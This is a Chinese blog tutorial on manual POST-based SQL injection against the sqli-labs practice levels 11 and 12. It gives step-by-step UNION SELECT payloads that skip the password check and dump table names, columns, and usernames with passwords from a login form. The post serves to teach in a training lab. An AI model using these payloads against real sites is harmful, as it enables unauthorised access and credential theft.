# 原创
：  （手工）【sqli-labs11-12】POST注入：基本步骤、示例

# （手工）【sqli-labs11-12】POST注入：基本步骤、示例

**目录**

[推荐：](#%C2%A0%E6%8E%A8%E8%8D%90%EF%BC%9A)

[一、POST（手工）SQL注入基本步骤：](#%E4%B8%80%E3%80%81%E8%AF%BB%E5%86%99%E6%B3%A8%E5%85%A5%EF%BC%88%E6%89%8B%E5%B7%A5%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E6%AD%A5%E9%AA%A4%EF%BC%9A)

[ 2.1、第一步：判断是否存在SQL漏洞](#2.1%E3%80%81%E7%AC%AC%E4%B8%80%E6%AD%A5%EF%BC%9A%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8SQL%E6%BC%8F%E6%B4%9E)

[2.2、第二步：判断字段数](#2.2%E3%80%81%E7%AC%AC%E4%BA%8C%E6%AD%A5%EF%BC%9A%E5%88%A4%E6%96%AD%E5%AD%97%E6%AE%B5%E6%95%B0)

[2.3、第三步：判断回显点](#2.3%E3%80%81%E7%AC%AC%E4%B8%89%E6%AD%A5%EF%BC%9A%E5%88%A4%E6%96%AD%E5%9B%9E%E6%98%BE%E7%82%B9)

[2.4、第四步：查询当前数据库](#2.4%E3%80%81%E7%AC%AC%E5%9B%9B%E6%AD%A5%EF%BC%9A%E6%9F%A5%E8%AF%A2%E5%BD%93%E5%89%8D%E6%95%B0%E6%8D%AE%E5%BA%93)

[2.5、第五步：查表名](#2.5%E3%80%81%E7%AC%AC%E4%BA%94%E6%AD%A5%EF%BC%9A%E6%9F%A5%E8%A1%A8%E5%90%8D)

[2.6、第六步：查字段](#2.6%E3%80%81%E7%AC%AC%E5%85%AD%E6%AD%A5%EF%BC%9A%E6%9F%A5%E5%AD%97%E6%AE%B5)

[2.7、第七步：查数据](#2.7%E3%80%81%E7%AC%AC%E4%B8%83%E6%AD%A5%EF%BC%9A%E6%9F%A5%E6%95%B0%E6%8D%AE)

[二、Less11（POST-Error based - Single Quotes String）](#%E4%BA%8C%E3%80%81Less8%EF%BC%88GET%20-%20Blind%20-%20Boolian%20Based%20-%20Single%20Quotes%EF%BC%89)

[2.1、简介：（错误-单引号）](#2.1%E3%80%81%E7%AE%80%E4%BB%8B%EF%BC%9A%EF%BC%88%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E6%B3%A8%E5%85%A5%EF%BC%89)

[第一步：判断注入点](#%E7%AC%AC%E4%B8%80%E6%AD%A5%EF%BC%9A)

[第二步：分析注入方法](#%E7%AC%AC%E4%BA%8C%E6%AD%A5%EF%BC%9A)

[第三步：常规的获取数据步骤](#%E7%AC%AC%E4%B8%89%E6%AD%A5%EF%BC%9A)

[爆数据：](#%E6%9C%80%E5%90%8E%E7%88%86%E6%95%B0%E6%8D%AE%EF%BC%9A)

[三、Less12（POST-Error based - Double Quotes String-with twist）](#%E4%B8%89%E3%80%81Less12%EF%BC%88POST-Error%20based%20-%20Double%20Quotes%20String-with%20twist%EF%BC%89)

[3.1、简介：（错误-双引号）](#2.1%E3%80%81%E7%AE%80%E4%BB%8B%EF%BC%9A%EF%BC%88%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E6%B3%A8%E5%85%A5%EF%BC%89)

---


> 
<h2>推荐：</h2>
[【SQL注入】POST注入：高危点、利用过程<img alt="icon-default.png?t=M5H6" src="https://csdnimg.cn/release/blog_editor_html/release2.1.4/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=M5H6"/>https://blog.csdn.net/qq_53079406/article/details/125652873?spm=1001.2014.3001.5501](https://blog.csdn.net/qq_53079406/article/details/125652873?spm=1001.2014.3001.5501)



---


---


## 一、POST（手工）SQL注入基本步骤：

> 
<h3> 2.1、第一步：判断是否存在SQL漏洞</h3>
在输入框中填入一些闭合的符号，看页面是否异常
如： ’        "          ')          ")
当页面发生错误，则证明闭合有效
有时单双引号闭合后，还要考虑括号个数
<hr/>

<h3>2.2、第二步：判断字段数</h3>
例如：
”)order by 3#
当回显正确的时候，就判断出字段数
<hr/>
<h3>2.3、第三步：判断回显点</h3>
使用union 联合查询找到回显点
例如：
") union select 1,2,3#
<hr/>
<h3>2.4、第四步：查询当前数据库</h3>
例如：
") union select 1,database(),3#
<hr/>
<h3>2.5、第五步：查表名</h3>
例如：
") union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=“security” #
<hr/>
<h3>2.6、第六步：查字段</h3>
例如：
") union select 1,2,group_concat(column_name) from information_schema.columns where table_name=“users” #
<hr/>
<h3>2.7、第七步：查数据</h3>
例如：
")union select 1,username,password from users where id=2 #


### 2.2、第二步：判断字段数

---


### 2.4、第四步：查询当前数据库

---


### 2.6、第六步：查字段

---


---


---


## 二、Less11（POST-Error based - Single Quotes String）

> 
<h3>2.1、简介：（错误-单引号）</h3>
请求方法：POST
方法：报错回显
分类：看我们是否找到账号名
在代码中，账号输入框和密码输入框是连着的
在第一个代码框最后注释掉后面内容后，就不需要输入密码了


> 
<h4>第一步：判断注入点</h4>
输入了一个单引号显示错误，说明可能存在注入点，符号可能为单引号


<hr/>

<h4>第二步：分析注入方法</h4>
点击post date输入
uname=admin' and 1=1#
（或者在第一个框输入admin' and 1=1#  ）
字符型注入

<hr/>
 

<h4>第三步：常规的获取数据步骤</h4>
执行其他读取修改数据等操作（常规操作了）
例如（报错回显）
admin' and 1=2 union select 1,database()# 


猜显示位数，获取数据库，获取表名，获取列名，获取数据
<blockquote>
①uname=admin' and 1=2 union select 1,2 #
②uname=admin' and 1=2 union select 1,database() #
③uname=admin' and 1=2 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#
④uname=admin' and 1=2 union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'#
⑤uname=admin' and 1=2 union select 1,group_concat(username,password) from users #


#### 第二步：分析注入方法

---


#### 爆数据：

admin' and 1=2 union select 1,group_concat(username,password) from users #<img alt="" height="879" src="https://img-blog.csdnimg.cn/08583711ccec451586620031f85f018f.png" width="1200"/>

 

---


---


## 三、Less12（POST-Error based - Double Quotes String-with twist）

> 
<h3>3.1、简介：（错误-双引号）</h3>
请求方法：POST
方法：报错回显
分类：看我们是否找到账号名
在代码中，账号输入框和密码输入框是连着的
在第一个代码框最后注释掉后面内容后，就不需要输入密码了


> 
利用过程和Less11一样

